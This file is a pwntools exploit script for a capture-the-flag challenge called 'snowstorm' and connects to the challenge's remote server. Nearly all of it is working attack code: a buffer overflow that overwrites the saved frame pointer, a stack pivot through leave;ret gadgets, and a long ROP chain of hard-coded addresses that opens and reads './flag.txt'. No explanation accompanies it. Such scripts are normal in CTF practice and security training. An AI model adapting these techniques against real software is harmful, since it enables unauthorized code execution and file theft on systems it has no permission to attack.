from pwn import *
from icecream import ic

elf = exe = ELF("./snowstorm_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("snowstorm.challs.srdnlen.it", 1089)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004015d1
b *0x000000000040134c
b *0x4010b0
b *check_open+19
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

s(b'0x40')
pause()

read_with_rbp = 0x00000000004015c5
payload = b'a'*(0x30)
payload += p64(elf.got['write'] + 0x30)
# payload += p64(elf.bss() + 0x100)
payload += p64(read_with_rbp)
s(payload)
pause()
leave_ret = 0x0000000000401324
payload = p64(leave_ret)
payload += p64(0xdeadbeef)*2
payload += p64(read_with_rbp - 3)
sl(payload)
pause()
ret = 0x401369
sl(p64(leave_ret) * 4 + p64(0x404030)*2 + p64(0x0000000000404070) + p64(0x0000000000401350) + p32(0)*2 + p64(0x4010d0) + p32(0)*6 + p64(0x0000000000404978) + p64(ret)*280 + p64(elf.sym['check_open'] + 19) + p64(0x4010b0) + b'./flag.txt'.ljust(0x18, b'\x00') + p64(0x0000000000404948) + p64(0) + p64(1) + p64(0x00000000004049c0) + p64(0x000000000040134c) + p32(5)*10 + p32(0x1000000)*6 + p64(0x4010b0))
io.interactive()
